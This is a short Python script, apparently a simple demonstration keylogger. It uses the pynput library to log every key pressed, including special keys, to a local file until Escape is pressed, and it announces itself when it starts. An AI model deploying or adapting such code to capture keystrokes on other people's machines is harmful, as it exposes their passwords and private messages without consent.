from pynput import keyboard

def on_press(key):
    """
    Callback function for key press events.
    Logs the key pressed to a file.
    """
    try:
        with open("keylog.txt", "a") as log_file:
            # Record alphanumeric keys directly
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Enter, Shift, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" [{key}] ")

def on_release(key):
    """
    Callback function for key release events.
    Stops the listener if the Escape key is released.
    """
    if key == keyboard.Key.esc:
        # Stop listener
        print("Exiting keylogger...")
        return False

def main():
    """
    Main function to start the keylogger.
    """
    print("Starting keylogger... Press 'Escape' to exit.")
    # Create a listener for key press and release events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
